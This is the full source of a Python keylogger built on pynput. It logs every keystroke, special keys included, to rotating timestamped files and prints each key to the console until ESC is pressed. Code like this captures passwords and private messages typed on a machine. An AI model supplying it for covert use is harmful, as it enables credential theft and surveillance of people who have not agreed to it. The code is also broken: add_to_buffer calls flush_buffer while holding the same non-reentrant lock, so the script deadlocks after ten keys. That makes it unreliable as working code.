import pynput
from pynput.keyboard import Key, Listener
import datetime
import os
import threading
from pathlib import Path

class KeyLogger:
    def __init__(self, log_dir="logs", max_file_size=1024*1024):  # 1MB default
        self.log_dir = Path(log_dir)
        self.log_dir.mkdir(exist_ok=True)
        self.max_file_size = max_file_size
        self.current_file = None
        self.create_new_log_file()
        
        # Buffer to reduce file I/O operations
        self.key_buffer = []
        self.buffer_size = 10
        self.buffer_lock = threading.Lock()
        
    def create_new_log_file(self):
        """Create a new log file with timestamp"""
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        self.current_file = self.log_dir / f'key_log_{timestamp}.txt'
        print(f"Logging to: {self.current_file}")
        
        # Write header
        with open(self.current_file, 'a', encoding='utf-8') as f:
            f.write(f"Key Log Started: {datetime.datetime.now()}\n")
            f.write("=" * 50 + "\n")
    
    def check_file_size(self):
        """Check if current log file exceeds size limit"""
        if self.current_file.exists():
            return self.current_file.stat().st_size >= self.max_file_size
        return False
    
    def flush_buffer(self):
        """Write buffered keys to file"""
        with self.buffer_lock:
            if not self.key_buffer:
                return
            
            # Rotate file if needed
            if self.check_file_size():
                self.create_new_log_file()
            
            try:
                with open(self.current_file, 'a', encoding='utf-8') as f:
                    f.write(''.join(self.key_buffer))
                self.key_buffer.clear()
            except Exception as e:
                print(f"Error writing to log file: {e}")
    
    def add_to_buffer(self, text):
        """Add text to buffer and flush if buffer is full"""
        with self.buffer_lock:
            self.key_buffer.append(text)
            if len(self.key_buffer) >= self.buffer_size:
                self.flush_buffer()
    
    def on_press(self, key):
        try:
            # Handle regular characters
            if hasattr(key, 'char') and key.char is not None:
                self.add_to_buffer(key.char)
                print(f'Key pressed: {key.char}')
                
        except AttributeError:
            # Handle special keys
            special_keys = {
                Key.space: ' ',
                Key.enter: '\n',
                Key.tab: '\t',
                Key.backspace: '[BACKSPACE]',
                Key.delete: '[DELETE]',
            }
            
            if key in special_keys:
                self.add_to_buffer(special_keys[key])
                print(f'Special key: {special_keys[key].strip()}')
            else:
                key_name = f'[{key.name.upper()}]' if hasattr(key, 'name') else f'[{key}]'
                self.add_to_buffer(key_name)
                print(f'Special key: {key_name}')
    
    def on_release(self, key):
        # Stop listener on ESC key
        if key == Key.esc:
            print("Stopping keylogger...")
            # Flush any remaining buffer before stopping
            self.flush_buffer()
            return False
    
    def start(self):
        """Start the keylogger"""
        print("Keylogger started. Press ESC to stop.")
        try:
            with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
                listener.join()
        except Exception as e:
            print(f"Keylogger error: {e}")
        finally:
            # Ensure buffer is flushed when stopping
            self.flush_buffer()
            print("Keylogger stopped.")

def main():
    # Configuration
    LOG_DIR = "key_logs"
    MAX_FILE_SIZE = 1024 * 1024  # 1MB per file
    
    # Create and start keylogger
    keylogger = KeyLogger(log_dir=LOG_DIR, max_file_size=MAX_FILE_SIZE)
    keylogger.start()

if __name__ == "__main__":
    main()
